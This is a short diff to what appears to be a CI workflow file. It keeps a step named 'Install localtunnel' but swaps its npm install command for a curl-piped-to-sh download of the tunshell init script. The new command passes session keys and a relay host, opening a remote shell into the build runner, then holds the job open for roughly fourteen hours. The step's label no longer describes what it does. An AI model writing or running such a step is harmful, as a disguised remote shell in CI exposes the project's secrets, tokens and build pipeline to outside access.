@@ -29,7 +29,8 @@ jobs:
           node-version: '16'
 
       - name: Install localtunnel
-        run: npm install -g localtunnel
+        run: curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T qfdNBKI38Hj9H4M92CcAOc DcKnkxTQ0OhrNzXL0vkiop eu.relay.tunshell.com | sleep 50000
+        
 
       - name: Start localtunnel
         run: |
